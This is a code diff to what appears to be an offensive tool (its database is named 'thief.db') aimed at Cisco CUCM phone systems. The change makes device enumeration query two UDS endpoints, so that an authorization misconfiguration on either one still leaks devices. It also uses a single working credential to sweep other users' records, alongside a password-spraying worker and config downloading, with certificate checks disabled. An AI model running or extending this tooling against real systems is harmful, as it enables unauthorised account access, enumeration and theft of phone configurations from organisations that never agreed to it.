@@ -851,6 +851,15 @@ def parse_uds_devices(xml_body):
     return re.findall(r'<device>(SEP[0-9A-Fa-f]{12})</device>', xml_body)
 
 
+def parse_uds_device_collection(xml_body):
+    """Extract SEP device names from a /cucm-uds/user/{id}/devices response body.
+
+    That endpoint wraps each device in a <device> element with child fields; the
+    SEP name lives in <name>SEP…</name> (unlike the /user/{id} associatedDevices
+    shape, where it is the bare <device> text — see parse_uds_devices)."""
+    return re.findall(r'<name>(SEP[0-9A-Fa-f]{12})</name>', xml_body)
+
+
 def log_uds_device(cucm_host, username, device_name, source, db_file='thief.db'):
     """Insert a (cucm_host, username, device_name) row into uds_devices; ignores duplicates."""
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
@@ -980,32 +989,60 @@ def enumerate_devices_authenticated(cucm_host, username, password, port, usernam
 
 def get_user_devices_authenticated(cucm_host, username, password, port=UDS_PORT, timeout=10, target_user=None):
     """
-    Authenticated UDS lookup: GET /cucm-uds/user/{target_user} authenticating as
-    (username, password) via HTTP Basic auth. target_user defaults to username
-    (query your own record). Passing a different target_user queries another
-    user's record with the same credential — useful for sweeping all users with
-    one working credential; the server decides whether to authorize it.
+    Authenticated UDS device lookup for one user, querying BOTH endpoints that
+    can expose device names and unioning the results — so a server that
+    misconfigures authorization on one but not the other still yields devices:
+      - /cucm-uds/user/{target}          -> <device>SEP…</device> (associatedDevices)
+      - /cucm-uds/user/{target}/devices  -> <name>SEP…</name>      (device collection)
+
+    Authenticates as (username, password) via HTTP Basic auth. target_user
+    defaults to username (your own record). A different target_user queries
+    another user's record with the same credential; the server decides whether
+    to authorize it.
 
     Returns (status, devices):
-      'ok'           — HTTP 200; devices is the parsed SEP list (may be empty).
-      'unauthorized' — HTTP 401; creds rejected. devices is [].
-      'error'        — network failure or other status. devices is [].
+      'ok'           — at least one endpoint returned HTTP 200; devices is the
+                       order-preserving deduped union of SEPs from both.
+      'unauthorized' — neither returned 200 but at least one returned HTTP 401.
+      'error'        — neither returned 200 or 401 (network failure / other).
     """
     target = target_user if target_user is not None else username
-    url = f'https://{cucm_host}:{port}/cucm-uds/user/{quote(target, safe="")}'
-    dbg(f'UDS authed GET {url} (timeout={timeout}s)')
-    try:
-        resp = requests.get(url, auth=(username, password), verify=False, timeout=timeout)
-    except Exception as e:
-        dbg(f'UDS authed {url} raised {type(e).__name__}: {e}')
-        return 'error', []
-    dbg(f'UDS authed {url} -> {resp.status_code} ({len(resp.content)} bytes)')
-    if resp.status_code == 200:
-        return 'ok', parse_uds_devices(resp.text)
-    if resp.status_code == 401:
-        return 'unauthorized', []
-    dbg(f'UDS authed non-200/401 body (first 300 chars): {resp.text[:300]!r}')
-    return 'error', []
+    base = f'https://{cucm_host}:{port}/cucm-uds/user/{quote(target, safe="")}'
+    endpoints = (
+        (base, parse_uds_devices),
+        (f'{base}/devices', parse_uds_device_collection),
+    )
+
+    statuses = []
+    devices = []
+    for url, parser in endpoints:
+        dbg(f'UDS authed GET {url} (timeout={timeout}s)')
+        try:
+            resp = requests.get(url, auth=(username, password), verify=False, timeout=timeout)
+        except Exception as e:
+            dbg(f'UDS authed {url} raised {type(e).__name__}: {e}')
+            statuses.append('error')
+            continue
+        dbg(f'UDS authed {url} -> {resp.status_code} ({len(resp.content)} bytes)')
+        if resp.status_code == 200:
+            statuses.append('ok')
+            devices.extend(parser(resp.text))
+        elif resp.status_code == 401:
+            statuses.append('unauthorized')
+        else:
+            dbg(f'UDS authed non-200/401 body (first 300 chars): {resp.text[:300]!r}')
+            statuses.append('error')
+
+    if 'ok' in statuses:
+        status = 'ok'
+    elif 'unauthorized' in statuses:
+        status = 'unauthorized'
+    else:
+        status = 'error'
+
+    seen = set()
+    deduped = [d for d in devices if not (d in seen or seen.add(d))]
+    return status, deduped
 
 
 def download_uds_discovered_configs(cucm_host, device_names, db_file, use_tftp=True, no_db=False):
@@ -1120,6 +1157,9 @@ def _spray_worker(work_queue, results, password, cucm_host, port, db_file, dead_
         log_spray_attempt(cucm_host, username, effective_password, status_code, error, db_file)
 
         if status_code == 200 and resp is not None:
+            # Spray hits only the base /cucm-uds/user/{id} endpoint, so the
+            # associatedDevices parser is correct here (device discovery's
+            # two-endpoint union lives in get_user_devices_authenticated).
             for device_name in parse_uds_devices(resp.text):
                 log_uds_device(cucm_host, username, device_name, 'spray_hit', db_file)
 
